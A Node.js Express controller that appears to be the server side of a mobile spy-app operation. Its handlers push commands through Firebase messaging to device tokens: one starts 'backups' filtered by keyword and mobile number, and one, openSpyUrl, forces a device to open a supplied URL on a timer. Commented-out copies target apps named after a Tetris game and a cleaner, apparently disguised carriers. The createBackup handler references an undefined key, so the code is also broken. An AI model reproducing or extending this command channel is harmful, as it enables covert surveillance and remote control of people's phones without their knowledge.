const Backup = require('../models/Backup');
const errorHandler = require('../utils/errorHandler');
const gcm = require('node-gcm');
// const tetrisFcmApiKey = require('../config/keys').tetrisFcmApiKey;
// const aCleanerFcmApiKey = require('../config/keys').aCleanerFcmApiKey;
 const spyFcmApiKey = require('../config/keys').spyFcmApiKey;

module.exports.getBackups = async (req, res, next) => {
  try {
    const backups = await Backup.find().populate('device');
    res.status(200).json(backups);
  } catch (e) {
    errorHandler(res, e);
  }
}

module.exports.createBackup = async (req, res, next) => {
  const deviceToken = req.body.fcmToken;
  const backup = new Backup({
    device: req.body.device,
    keyWord: req.body.keyWord,
    mobileNumber: req.body.mobileNumber,
    fromDate: req.body.fromDate,
    toDate: req.body.toDate
  })
  const sender = new gcm.Sender(fcmApiKey);
  const message = new gcm.Message({
    data: {
      keyWord: req.body.keyWord,
      mobileNumber: req.body.mobileNumber
    }
  })
  sender.send(message, deviceToken, (err, response) => {
    if (!response.success) {
      errorHandler(res, 'Something went wrong')
    } else {
      backup.save().then(() => {
        res.status(201).json(backup)
      })
    }
  });
}

module.exports.openSpyUrl = async (req, res, next) => {
  const url = req.body.url;
  const timer = req.body.timer;

  const spySender = new gcm.Sender(spyFcmApiKey);
  const deviceToken = req.body.spyFcmToken;

  const message = new gcm.Message({
    data: {
      url: url,
      timer: timer
    }
  });

  spySender.send(message, deviceToken, (err, response) => {
    if (!response.success) {
      errorHandler(res, 'Something went wrong')
    } else {
        res.status(200).json({message: 'Success'})
    }
  });
}

// module.exports.openTetrisUrl = async (req, res, next) => {
//   const url = req.body.url;
//   const timer = req.body.timer;

//   const tetrisSender = new gcm.Sender(tetrisFcmApiKey);
//   const deviceToken = req.body.tetrisFcmToken;

//   const message = new gcm.Message({
//     data: {
//       url: url,
//       timer: timer
//     }
//   });

//   tetrisSender.send(message, deviceToken, (err, response) => {
//     if (!response.success) {
//       errorHandler(res, 'Something went wrong')
//     } else {
//         res.status(200).json({message: 'Success'})
//     }
//   });
// }

// module.exports.openACleanerUrl = async (req, res, next) => {
//   const url = req.body.url;
//   const timer = req.body.timer;

//   const aCleanerSender = new gcm.Sender(aCleanerFcmApiKey);
//   const deviceToken = req.body.aCleanerFcmToken;

//   const message = new gcm.Message({
//     data: {
//       url: url,
//       timer: timer
//     }
//   });

//   aCleanerSender.send(message, deviceToken, (err, response) => {
//     if (!response.success) {
//       errorHandler(res, 'Something went wrong')
//     } else {
//         res.status(200).json({message: 'Success'})
//     }
//   });
// }
